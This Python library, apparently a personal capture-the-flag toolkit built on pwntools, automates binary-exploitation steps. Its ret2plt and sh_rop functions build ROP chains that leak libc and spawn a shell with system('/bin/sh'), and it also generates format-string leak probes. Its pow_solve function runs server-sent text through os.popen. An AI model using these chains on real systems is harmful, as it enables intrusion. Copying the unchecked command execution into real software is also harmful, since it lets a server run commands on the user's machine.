#!/usr/bin/env python3
# Author: @TheFlash2k

"""
flashlib - A wrapper around pwntools but also with a few of the functions that I use on a daily basis.
"""
import pwnlib.rop
from .utils import *
from ctypes import *

# For later use.
io = exe = cleaned_exe = libc = elf = e = rop = rop_libc = ctype_libc = None

def create_fmtstr(
	start: int,
	end: int = 0,
	atleast: int = 10,
	max_len: int = -1,
	with_index: bool = False,
	specifier: str = "p",
	seperator: str = '|'
) -> bytes:
	"""
	Creates a format string that we can use to fuzz and check at
	what index what data exists.
	"""
	end = start+atleast if end == 0 else end
	fmt = "{seperator}%{i}${specifier}" if not with_index else "{seperator}{i}=%{i}${specifier}"
	rt = ""
	for i in range(start, end+1):
		rt += fmt.format(i=i, specifier=specifier, seperator=seperator)
	''' Making sure we always get a valid fmt in the max_len range '''
	if max_len <= 0:
		return rt.encode()
	rt = seperator.join(rt[:max_len].split(seperator)[:-1]) \
		if rt[:max_len][-1] != specifier else rt[:max_len]
	return rt.encode()

def validate_tube(comm: pwnlib.tubes = None) -> pwnlib.tubes:
	"""
	Simply validates if IO exists in the global namespace.

	comm: pwnlib.tubes
		The underlying communication/io. If not set, the default `io` is used.
	"""
	if comm:
		return comm
	_io = globals().get('io', None)
	if not _io:
		error("No tube for communication specified!")
	return _io

def pow_solve(comm: pwnlib.tubes = None, raw_exec: bool = False, delim: str = ": "):
	"""
	Solves proof of work for:

	1. theflash2k/pwn-chal
	2. pwn.red/jail

	comm: pwnlib.tubes
		The underlying communication/io. If not set, the default `io` is used.

	raw_exec: bool [Default: False]
		If this is set, then it will simply read a line and execute it

	delim: str [Default: ": "]
		The delimiter after which, the proof of work is sent.

	"""
	io = validate_tube(comm)
	if not raw_exec: io.recvline()
	cmd = io.recvline().decode()
	if not raw_exec:
		info(f"Solving PWNCHAL POW: {cmd.split()[-1]}")
	else:
		info(f"Executing: {cmd}")
	_pow = os.popen(cmd).read()
	_pow = _pow.split(': ')[1] if ': ' in _pow else _pow # pwn-chal
	info(f"Solved Proof-of-work: {_pow}")
	io.sendlineafter(encode(delim), encode(_pow)) if delim else \
		io.sendline(encode(_pow))


def parse_host(args: list):
	"""
	args: list
		Arguments that will be parsed to extract only IP and port.

	Returns: parsed tuple with (IP, PORT)
	"""
	# We'll firstly check if 'nc' exists:
	args = args[1:] # remove the filename
	if args[0] == 'nc':
		args = args[1:]
	if ':' in args[0]:
		args = args[0].split(':')
	return (args)

def attach(
	gdbscript: str = "",
	halt: bool = False,
	remote: tuple = None,
	_io: pwnlib.tubes = None,
	exe: str = "/usr/bin/gdb",
	multiarch: bool = False
):
	"""
	gdbscript: str
		The gdbscript that we want to use.
		Default: ""

	halt: bool
		Halt and waits for input when attaching gdb.
		Default: False

	remote: tuple
		The connection that we can use for remote-debugging
		session.
		Default: None (but actually defaults to: ("127.0.0.1", 1234))

	_io: pwnlib.tubes
		The tube (if there was any before), the gdb will be attached to
		that. If there aren't any the default `io` will be used.
		Default: None

	exe: str
		The underlying path to gdb file that will be used when remote is
		set.
		Default: /usr/bin/gdb

	multiarch: bool
		To use the multiarch version of GDB or not.
		If set, the exe used is: `/usr/bin/gdb-multiarch`
	"""

	io = validate_tube(_io)
	gdbscript = (f"file {cleaned_exe}\n" if args.REMOTE else "") + gdbscript
	_exe, _mode = (None, io) if not remote else (exe, remote)

	if multiarch:
		context.native = False
		if _exe: exe += "-multiarch"

	if args.GDB:
		"""
		We want to halt before attaching our gdb it it's
		in debug mode and remote mode.

		Remote will always halt first.
		"""
		if (halt and _exe) or (remote and args.REMOTE): input("[?] Attach GDB?")
		gdb.attach(_mode, exe=_exe, gdbscript=gdbscript)
		if halt and not _exe: input("[?] Continue?")

def _init_base(
	base_exe: str,
	argv: list = None,
	libc_path: str = None,
	get_libc: bool = True
):
	"""
	Initializes the underlying global objects required by other utils.

	base_exe: str
		The base executable that will be used.

	argv: list
		The arguments that will be passed to the executable.

	libc_path: str
		The path to the libc that will be used.
		Default: None (uses the one from the binary itself)

	get_libc: bool
		Whether to get the libc or not.
		Default: True

	Returns:
		A tuple of:
			- exe: str
				The executable that will be used.
			- cleaned_exe: str
				The cleaned executable that will be used.
			- libc: ELF object (if get_libc is True)
			- elf: ELF object
			- ctype_libc: ctypes.CDLL object (if get_libc is True)
	"""
	global exe, cleaned_exe, libc, elf, ctype_libc
	exe         = ([base_exe] + argv) if argv else base_exe.split()
	cleaned_exe = exe[0] # actual file name
	try:
		elf = e = context.binary = ELF(cleaned_exe)
	except:
		context.arch = 'amd64'
		elf = None
	if get_libc and elf and elf.get_section_by_name('.dynamic'):
		libc = elf.libc if not libc_path else ELF(libc_path)
		try:
			ctype_libc = cdll.LoadLibrary(libc.path)
		except:
			ctype_libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')

	# Since it's a library, we need to update the caller global frame
	caller_globals = sys._getframe(2).f_globals # depth is 2 because it's always invoked by another func
	caller_globals.update({'exe': exe, 'e': elf, 'elf': elf, 'cleaned_exe': cleaned_exe})
	sys.modules[__name__].__dict__.update({'exe': exe, 'elf': elf, 'cleaned_exe': cleaned_exe})
	if get_libc:
		caller_globals.update({'libc': libc, 'ctype_libc': ctype_libc})

	return exe, cleaned_exe, libc, elf, ctype_libc

def get_ctx(
	_exe: str,
	argv: list = None,
	aslr: bool = True,
	remote_host: tuple = None,
	keyfile: str = "~/.ssh/id_rsa",
	basedir: str = None,
	libc_path: str = None,
) -> pwnlib.tubes:
	
	"""
	Returns the context that will be used for the tube.

	_exe: str
		The executable that will be used.
		Required: True

	argv: list
		The arguments that will be passed to the executable.
		Default: None

	aslr: bool
		Whether to use ASLR or not.
		Default: True

	remote_host: tuple
		The host that will be used for remote connection.
		Default: None (if None, they're fetched from sys.argv)
	
	keyfile: str
		The keyfile that will be used for SSH connection (pwn.college only).
		Default: ~/.ssh/id_rsa

	basedir: str
		The base directory that will be used for the executable
		when in the context of an SSH connection.
		Default: None (if None, it will be the current directory)

	Examples:

		*SSH*:
		> If both keyfile and password are specified, keyfile is checked, if it exists, it is used,
		if not, password is used for authentication.

		./exploit.py SSH HOST=hostname USERNAME=username PASSWORD=password | KEYFILE=keyfile PORT=port
		./exploit.py SSH HOST=localhost USERNAME=root KEYFILE=/root/.ssh/id_rsa PORT=2222
			<OR>
		./exploit.py SSH username:password@host:port
		./exploit.py SSH root:root@localhost:22
	"""
	global io, elf

	if not io and not elf:
		"""
		added to remove dependency on always invoking
		init function.
		"""
		_init_base(_exe, argv=argv, libc_path=libc_path)

	if not remote_host and args.REMOTE:
		remote_host = parse_host(sys.argv)

	if args.COLLEGE:
		# for all my pwn-college enthuiasts:
		sh = ssh(user="hacker", host="dojo.pwn.college", keyfile=keyfile)
		io = sh.process(f"/challenge/{cleaned_exe}", cwd=basedir)
	elif args.SSH:
		username = password = host = None
		port = 22
		if args.USERNAME: username = args.USERNAME
		if args.PASSWORD: password = args.PASSWORD
		if args.HOST:     host = args.HOST
		if args.PORT:     port = int(args.PORT)
		if args.KEYFILE:  keyfile = args.KEYFILE

		if host and ':' in host:
			host, port = host.split(':')
			port = int(port)
		
		local_argv = sys.argv[1:]
		if not username and not password and not host:
			if len(local_argv) != 1:
				error("No username, password/keyfile, host, port specified with SSH")
			if '@' not in local_argv[0]:
				error(f"Invalid hostname")

			userdata, hostdata = local_argv[0].split('@')
			if ':' not in userdata:
				username = userdata
				warn(f"No SSH password was specified, using keyfile: {keyfile}")
			else:
				username, password = userdata.split(':')

			if ':' not in hostdata:
				host = hostdata
				port = 22
			else:
				host, port = hostdata.split(':')
				port = int(port)

		if not username or not host:
			error("No username or host specified with SSH")
		
		info(f"Authenticating to {host} as {username} with password: {'*'*len(password)}")
		sh = ssh(user=username, host=host, password=password)
		io = sh.process(cleaned_exe, cwd=basedir)
	else:
		io = remote(*remote_host) if args.REMOTE else process(argv=exe, aslr=aslr)

	sys._getframe(1).f_globals.update({'io': io})
	sys._getframe(2).f_globals.update({'io': io})
	sys.modules[__name__].__dict__.update({'io': io})
	return io

def init(
	base_exe: str,
	argv: list = None,
	libc_path: str = None,
	aslr: bool = True,
	get_libc: bool = True,
	setup_rop: bool = False,
	setup_libc_rop: bool = False,
	var_name: str = "io",
) -> tuple:
	"""
	Method that initializes all the internals.

	base_exe: str
		The base executable that will be used.
		[Required]

	argv: list
		The arguments that will be passed to the executable.

	libc_path: str
		The path to the libc that will be used.
		Default: None (uses the one from the binary itself)

	aslr: bool
		Whether to use ASLR or not.
		Default: True

	get_libc: bool
		Whether to get the libc or not.
		Default: True

	setup_rop: bool
		Whether to setup the rop object or not.
		Default: False

	setup_libc_rop: bool
		Whether to setup the rop object for libc or not.
		Default: False

	var_name: str
		The variable name that will be used for the io object.
		Default: io

	Returns:
		A tuple of:
			- io: pwnlib.tubes
			- elf: ELF object
			- libc: ELF object (if get_libc is True)
			- rop: ROP object (if setup_rop is True)
			- rop_libc: ROP object (if setup_libc_rop is True)
	"""
	global io, exe, cleaned_exe, libc, elf, ctype_libc, rop_libc, rop

	if not context.defaults["aslr"]:
		aslr = False

	if context.defaults['log_level'] == 10: # 10 == debug_mode
		context.log_level = 'debug'
	context.arch = 'amd64'

	_init_base(base_exe, argv, libc_path, get_libc)
	io = get_ctx(base_exe, argv, aslr, libc_path=libc_path)

	# just so that I can use cyclic(N) instead of cyclic(N, n=8)
	context.cyclic_size = 0x8 if \
		context.arch == 'amd64' else 0x4

	rt = [io, elf]
	if get_libc: rt.append(libc)

	if setup_rop and elf:
		rop = ROP(elf)
		rt.append(rop)

	if get_libc and setup_libc_rop:
		rop_libc = ROP(libc)
		rt.append(rop_libc)

	sys._getframe(1).f_globals.update({var_name: io, 'rop_libc': rop_libc, 'rop': rop})
	sys.modules[__name__].__dict__.update({var_name: io, 'rop_libc': rop_libc, 'rop': rop})

	return rt

"""
Custom methods to be added to the pwnlib.tubes.*.* classes
"""
@add_method(pwnlib.tubes.process.process)
@add_method(pwnlib.tubes.remote.remote)
@add_method(pwnlib.tubes.ssh.ssh)
@add_method(pwnlib.tubes.ssh.ssh_process)
def recvafter(
	self,
	delim: bytes,
	n: int = 0x0,
	drop: bool = True,
	keepends: bool = False,
	timeout: int = pwnlib.timeout.maximum
):
	"""
	delim: bytes
		The delimiter till which data will be read and discarded.

	n: int
		The number of bytes to be read. If not specified, data till newline is read.
		Default: 0x0
	
	drop: bool
		Whether to drop.
		Default: True

	keepends: bool
		Whether to keep the newline or not.
		Default: False

	timeout: int
		The maximum waiting time after which connection is closed.
	"""
	self.recvuntil(encode(delim), drop=drop, timeout=timeout)
	return self.recv(n, timeout=timeout) if n else \
		self.recvline(keepends=keepends, timeout=timeout)

@add_method(pwnlib.tubes.process.process)
@add_method(pwnlib.tubes.remote.remote)
@add_method(pwnlib.tubes.ssh.ssh)
@add_method(pwnlib.tubes.ssh.ssh_process)
def recvafteruntil(
	self,
	delim_before: bytes,
	delim_after: bytes = b"\n",
	drop: bool = True,
	timeout: int = pwnlib.timeout.maximum
):
	"""
	delim_before: bytes
		The first delimiter till which connection is received

	delim_after: bytes
		The second delimiter.
			The actual data read is between the first and
			second delimiter (inclusive)

	drop: bool
		Whether to drop the newline or not.
		Default: True
	
	timeout: int
		The maximum waiting time after which connection is closed.
	"""
	self.recvuntil(encode(delim_before), drop=drop, timeout=timeout)
	return self.recvuntil(encode(delim_after), drop=drop, timeout=timeout)

@add_method(pwnlib.tubes.process.process)
@add_method(pwnlib.tubes.remote.remote)
@add_method(pwnlib.tubes.ssh.ssh)
@add_method(pwnlib.tubes.ssh.ssh_process)
def recvbetween(
	self,
	delim_before: bytes,
	delim_after: bytes = b"\n",
	drop: bool = True,
	timeout: int = pwnlib.timeout.maximum
):
	"""
	delim_before: bytes
		The first delimiter till which connection is received

	delim_after: bytes
		The second delimiter.
			The actual data read is between the first and
			second delimiter (exclusive)

	drop: bool
		Whether to drop the newline or not.
		Default: True
	
	timeout: int
		The maximum waiting time after which connection is closed.
	"""
	self.recvuntil(encode(delim_before), drop=drop, timeout=timeout)
	return self.recvuntil(encode(delim_after), timeout=timeout)[:-len(delim_after)]

"""
The only reason I am creating classes is because
if I don't do that, the default parameters would fail
because elf wouldn't be set and it would fail on .{got,plt}
"""
class elf:
	class got: puts = None
	class sym: main = None
	class plt: puts = None

def ret2plt(
	offset: int,
	got_fn: int       = elf.got.puts,
	plt_fn: int       = elf.plt.puts,
	ret_fn: int       = elf.sym.main,
	got_fn_name: str  = 'puts',
	rets: int         = 0x1,
	sendafter: bytes  = b"\n",
	postfix: bytes    = None,
	sendline: bool    = True,
	getshell: bool    = True,
	debug: bool       = False,
	_io: pwnlib.tubes = None,
) -> int:

	"""
	ret2plt - Performs rop automatically to get libc leak and
				attempts to spawn a shell.

	offset: int [ REQUIRED ]
		The offset at which we control RIP.

	got_fn: int
		The GOT entry which we want to leak from libc.
		Default: puts

	plt_fn: int
		The PLT entry with which got_fn will be passed in RDI.
		Default: puts

	ret_fn: int
		The function which will be invoked directly after the plt_fn
		Default: main

	got_fn_name: str
		The name of the GOT function leaked (required to calculte base.)
		Default: "puts"

	rets: int
		The number of RETs added for stack-alignment
			For system("/bin/sh"), there will always be -1 added to rets
			to keep the stack aligned.
		Default: 0x1

	sendafter: bytes
		The delimiter after which payload will be sent.
		Default: NEWLINE

	postfix: bytes
		The delimiter after which is the libc leak. Usually end-remarks.
		Default: None

	sendline: bool
		Whether to send a newline with the payload or not.
		If true, uses io.sendlineafter else io.sendafter
		Default: True

	getshell: bool
		If set, it will use the rop chain to call 'system("/bin/sh")'
		to spawn a shell and will also validate if the shell works.
		Default: True

	debug: bool
		If set, it will set the context logging to debug.
		Default: False

	_io: pwnlib.tubes
		Used in scenario if the base pwnlib.tubes.*.* is not io but
		something else. It will be validated as well.
		Default: None
			(uses underlying io that was created when "init" was invoked)
	"""

	global libc, rop

	got_fn = elf.got.puts if not got_fn else got_fn
	plt_fn = elf.plt.puts if not plt_fn else plt_fn
	ret_fn = elf.sym.main if not ret_fn else ret_fn

	io = validate_tube(_io)

	if debug:
		ctx = context.log_level
		context.log_level = 'debug'

	if not rop or not isinstance(rop, pwnlib.rop.rop.ROP):
		rop = ROP(elf)

	payload = flat(
		cyclic(offset, n=8),
		rop.rdi.address,
		got_fn,
		plt_fn,
		p64(rop.ret.address)*rets,
		ret_fn)
	(io.sendlineafter if sendline else io.sendafter)(
		encode(sendafter), payload
	)
	libc_fn = libc.symbols.get(got_fn_name, None)
	if not libc_fn:
		error(f"{got_fn_name} is not a valid function in libc!")
	try:
		if postfix:
			io.recvuntil(encode(postfix))
		libc.address = fixleak(io.recv(6)) - libc.symbols[got_fn_name]
		if libc.address & 0xFFF != 0:
			error("Didn't get proper libc base. Please check if the libc used is correct with the binary itself!\nDEBUG: Got leak: %#x" % libc.address)
	except:
		error("There might have been some stack alignment issue. Please debug.")

	if getshell:
		logleak(libc.address)
		payload = flat(
			cyclic(offset, n=8),
			rop.rdi.address,
			next(libc.search(b"/bin/sh")),
			p64(rop.ret.address)*(rets+1), # there's always one more required here.
			libc.sym.system)
		try:
			(io.sendlineafter if sendline else io.sendafter)(
				encode(sendafter), payload)
			io.sendline(b"echo 'theflash2k'")
			io.recvuntil(b"theflash2k\n")
		except:
			error("There might have been some stack alignment issue. Please debug.")
		# Got shell:
		success("Got shell!")
		io.sendline(b"id")
		if debug: context.log_level = ctx
		io.interactive()
	if debug and context.log_level != ctx:
		context.log_level = ctx
	return libc.address

def sender(ln: bool = True, _io: pwnlib.tubes = None):
	"""
	Returns io.sendafter if ln is True, otherwise io.sendlineafter.

	ln: bool
		If True, io.sendafter will be used.
		Default: True
	"""
	io = validate_tube(_io)
	return io.sendafter if ln else io.sendlineafter

def menu(idx: int, delim: bytes = b"> ", ln: bool = True, _io: pwnlib.tubes = None):
	"""
	idx: int
		The index that we want to send.

	delim: bytes
		The delimiter after which we will send idx

	ln: bool
		Whether to send a newline or not.
		Default: True

	_io: pwnlib.tubes
		The underlying communication tube
		Default: None (`io` is used)
	"""
	io = validate_tube(_io)
	(sender(ln=ln, _io=io))(
		encode(delim), encode(idx))

"""
These functions are for challenges where we have to
guess the random numbers using srand and rand
"""
try:
	ctype_libc = cdll.LoadLibrary(libc.path if globals().get('libc', None) else '/lib/x86_64-linux-gnu/libc.so.6')
except:
	ctype_libc = None

def libc_srand(seed: int = ctype_libc.time(0x0)):
	if ctype_libc:
		return ctype_libc.srand(seed)
	error("ctype_libc is not initialized!")

def libc_rand():
	if ctype_libc:
		return ctype_libc.rand()
	error("ctype_libc is not initialized!")

"""
Some utility functions
"""
def sh_rop(POPRDI_RET: int = None, system: int = None, sh: int = None, rets: int = 0x1, debug: bool = True):
	"""
	Returns a ROP payload for the following function call:

		`system("/bin/sh");`

	POPRDI_RET: int
		The address of `pop rdi; ret;` gadget.

		Default: 0x1
		> It will use the underlying elf/libc to extract the gadget

	system: int
		The address of `system` function.

		Default: None
		> It will use the underlying elf/libc to extract the address
	
	sh: int
		The address of the string "/bin/sh".

		Default: None

	rets: int
		The number of `ret;` to add before `system` call.
		Default: 0x1

	debug: bool
		Print debug messages to the console to have a better look at
		what's going on under the hood.
	"""
	global e, rop, libc, rop_libc

	_found = False

	if not (libc or (libc and not isinstance(libc, ELF))) and not system:
		error("LIBC not specified. Cannot build system rop chain")

	if not POPRDI_RET:
		if e and isinstance(e, ELF):
			# check if rop is set:
			if not rop or not isinstance(rop, pwnlib.rop.rop.ROP):
				if debug:
					info("Getting ROP from elf")
				rop = ROP(e)
			POPRDI_RET = rop.find_gadget(['pop rdi', 'ret'])[0]
			if not POPRDI_RET:
				if debug: warn("No POP RDI found in ELF. Trying libc...")
				_found = False

		if not _found:
			if not rop_libc:
				# we already know here that libc is valid.
				if debug:
					info("Getting ROP from libc")
				rop_libc = ROP(libc)
			POPRDI_RET = rop_libc.find_gadget(['pop rdi', 'ret'])[0]
				
		if not POPRDI_RET:
			error("No POP RDI found in ELF or libc. Please specify it manually.")
			return None
	
	if not system:
		if 'system' in dict(elf.symbols).keys():
			system = elf.sym.system
		if not system and 'system' in dict(libc.symbols).keys():
			system = libc.sym.system

	if not system:
		error("Address of system function couldn't be found!")
	
	if not sh:
		try:    sh = next(elf.search(b"/bin/sh\x00"))
		except: sh = next(libc.search(b"/bin/sh\x00"))

	if not sh:
		error("Address of /bin/sh string couldn't be found!")

	logleak(POPRDI_RET)
	logleak(system)
	logleak(sh)

	return flat(
		POPRDI_RET,
		sh,
		(POPRDI_RET+1)*rets,
		system)

def fmt_parse_leaks(
	delim: bytes = b"|",
	convert: bool = True,
	startswith: bytes = None,
	end: bytes = b"\n",
	_io: pwnlib.tubes = None
):
	"""
	Parse the leaks after a format string attack.

	delim: bytes
		The delimiter that will be used to split the leaks.
		Default: b"|"

	convert: bool
		If True, the leaks will be converted to integers.
		Default: True

	startswith: bytes
		The prefix that will be used to filter the leaks.
		If set to none, delim will be used.
		Default: None

	end: bytes
		The suffix that will be used to filter the leaks.
		Default: b"\n"

	_io: pwnlib.tubes
		The io object that will be used to read the leaks.
		Default: None
	"""
	io = validate_tube(_io)
	io.recvuntil(encode(delim if not startswith else startswith))

	leaks = io.recvuntil(encode(end)) if end \
		else io.recvline()

	if encode(leaks[-1]) == b"\n":
		leaks = leaks[:-1]

	leaks = leaks.split(delim)

	if convert:
		leaks = [hexleak(leak) for leak in leaks]

	return leaks
